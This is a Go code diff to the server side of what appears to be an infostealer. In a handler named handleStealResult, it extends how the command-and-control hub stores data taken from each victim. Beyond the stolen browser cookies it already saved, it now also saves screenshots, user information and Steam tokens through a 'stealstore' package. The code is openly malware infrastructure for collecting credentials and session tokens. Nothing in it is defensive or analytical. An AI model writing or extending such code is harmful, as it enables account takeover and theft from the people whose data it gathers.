@@ -324,17 +324,35 @@ func (h *Hub) handleStealResult(ws *websocket.Conn, payload map[string]any) {
 	}
 
 	stealErrors := ""
-	for browserName, cookies := range browsers {
-		if browserName == "_errors" {
-			stealErrors = cookies
-			log.Printf("[ws:steal_result] %s diag: %s", victimID, cookies)
+	for key, value := range browsers {
+		if key == "_errors" {
+			stealErrors = value
+			log.Printf("[ws:steal_result] %s diag: %s", victimID, value)
 			continue
 		}
-		if cookies == "" {
+		if key == "_screenshot" {
+			if err := stealstore.SaveScreenshot(victimID, value); err != nil {
+				log.Printf("[ws] steal screenshot error %s: %v", victimID, err)
+			}
 			continue
 		}
-		if err := stealstore.SaveResult(victimID, browserName, cookies); err != nil {
-			log.Printf("[ws] steal save error %s/%s: %v", victimID, browserName, err)
+		if key == "_userinfo" {
+			if err := stealstore.SaveUserInfo(victimID, value); err != nil {
+				log.Printf("[ws] steal userinfo error %s: %v", victimID, err)
+			}
+			continue
+		}
+		if key == "_steam" {
+			if err := stealstore.SaveSteamTokens(victimID, value); err != nil {
+				log.Printf("[ws] steal steam error %s: %v", victimID, err)
+			}
+			continue
+		}
+		if value == "" {
+			continue
+		}
+		if err := stealstore.SaveResult(victimID, key, value); err != nil {
+			log.Printf("[ws] steal save error %s/%s: %v", victimID, key, err)
 		}
 	}
 
